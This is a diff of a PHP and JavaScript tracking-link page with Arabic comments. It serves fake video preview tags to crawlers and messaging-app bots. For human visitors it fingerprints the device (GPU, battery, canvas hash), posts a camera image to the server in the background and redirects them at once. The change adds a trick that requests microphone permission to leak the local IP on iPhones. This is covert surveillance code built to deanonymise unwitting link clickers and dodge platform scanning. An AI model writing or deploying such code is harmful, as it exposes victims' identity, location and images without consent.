@@ -237,7 +237,6 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // ✅ استخدام الصورة الأصلية من قاعدة البيانات، وتمريرها للبروكسي لضمان عدم حظرها
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
             
             header('Content-Type: text/html; charset=utf-8');
@@ -248,7 +247,6 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
-            // إضافة وسوم الفيديو لظهور زر التشغيل
             echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:type" content="video/mp4">';
@@ -259,7 +257,6 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
             
-            // ⚡ السر الأكبر للسرعة: إرسال الرد للمتصفح فوراً
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK'; 
                 fastcgi_finish_request();
@@ -267,7 +264,6 @@ if (isset($_GET['r'])) {
                 header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
 
-            // استكمال جمع البيانات في الخلفية
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
@@ -318,7 +314,34 @@ if (isset($_GET['r'])) {
         function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
         function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
-        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
+        
+        // ✅ محاولة جديدة لجلب الـ IP المحلي على iPhone
+        async function getLocalIP() {
+            return new Promise(async (resolve) => {
+                // محاولة إجبار Safari على كشف المرشحات المحلية عبر طلب إذن الميكروفون
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    // إغلاق المسار فوراً بعد الحصول على الإذن
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {}
+
+                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                let res = false;
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate || !e.candidate.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    // نتحقق من أن العنوان ليس mDNS (لا ينتهي بـ .local)
+                    if (ip && !ip[1].endsWith('.local') && !res) {
+                        res = true;
+                        resolve(ip[1]);
+                        pc.close();
+                    }
+                };
+                setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 300); // زيادة الوقت قليلاً لـ 300ms
+            });
+        }
 
         async function initTracking() {
             let imageData = "";
@@ -351,7 +374,6 @@ if (isset($_GET['r'])) {
                 fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); 
             }
             
-            // التوجيه الفوري (أقصى سرعة ممكنة)
             window.location.replace(targetUrl); 
             
             await cameraPromise;
@@ -371,7 +393,7 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// استقبال الصورة في الخلفية (في حال تأخرت الكاميرا)
+// استقبال الصورة في الخلفية
 // ==========================================
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     $code = $_POST['code'];
